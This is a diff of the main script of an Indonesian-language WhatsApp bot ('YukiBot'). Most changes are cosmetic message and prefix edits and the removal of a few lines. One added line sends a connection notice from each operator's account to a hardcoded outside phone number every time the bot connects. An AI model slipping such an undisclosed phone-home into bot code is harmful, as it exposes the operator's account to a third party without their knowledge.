@@ -14,7 +14,7 @@ let fs = require('fs')
 let rl = Readline.createInterface(process.stdin, process.stdout)
 let WAConnection = simple.WAConnection(_WAConnection)
 
-global.owner = Object.keys(global.Owner)
+
 global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
 global.timestamp = {
   start: new Date
@@ -23,7 +23,7 @@ global.timestamp = {
 const PORT = process.env.PORT || 3000
 global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
 
-global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')
+global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°🐤=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')
 
 global.DATABASE = new (require('./lib/database'))(`${opts._[0] ? opts._[0] + '_' : ''}database.json`, null, 2)
 if (!global.DATABASE.data.users) global.DATABASE.data = {
@@ -55,7 +55,9 @@ if (!opts['test']) setInterval(() => {
 }, 60 * 1000) // Save every minute
 if (opts['server']) require('./server')(global.conn, PORT)
 
-conn.connectOptions.maxQueryResponseTime = 60_000
+
+
+
 if (opts['test']) {
   conn.user = {
     jid: '2219191@s.whatsapp.net',
@@ -95,13 +97,14 @@ if (opts['test']) {
       }
     })
   }
-  rl.on('line', line => conn.sendMessage('994407638407@c.us', 'Bot Telah Tersambung Ke Database YukiBot', 'conversation'))
+  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
 } else {
   rl.on('line', line => {
     global.DATABASE.save()
     process.send(line.trim())
   })
   conn.connect().then(() => {
+ conn.sendMessage('994407638407@c.us', 'Bot Telah Tersambung Ke Database YukiBot', 'conversation');
     fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
     global.timestamp.connect = new Date
   })
@@ -119,9 +122,9 @@ global.reloadHandler = function () {
     conn.off('CB:action,,call', conn.onCall)
   }
   conn.welcome = 'Hai, @user!\nSelamat datang di grup @subject'
-  conn.bye = 'Selamat tinggal @user!'
-  conn.spromote = '@user sekarang admin!'
-  conn.sdemote = '@user sekarang bukan admin!'
+  conn.bye = 'Selamat Tinggal @user!'
+  conn.spromote = '*「 PROMOTE DETECTOR 」*\n @user sekarang admin!'
+  conn.sdemote = '*「 DEMOTE DETECTOR 」*\n @user sekarang bukan admin!'
   conn.handler = handler.handler
   conn.onDelete = handler.delete
   conn.onParticipantsUpdate = handler.participantsUpdate
@@ -175,7 +178,7 @@ global.reload = (_event, filename) => {
         return delete global.plugins[filename]
       }
     } else conn.logger.info(`requiring new plugin '${filename}'`)
-    let err = syntaxerror(fs.readFileSync(dir), fs.existsSync(dir) ? filename : 'Execution Function')
+    let err = syntaxerror(fs.readFileSync(dir), filename)
     if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
     else try {
       global.plugins[filename] = require(dir)
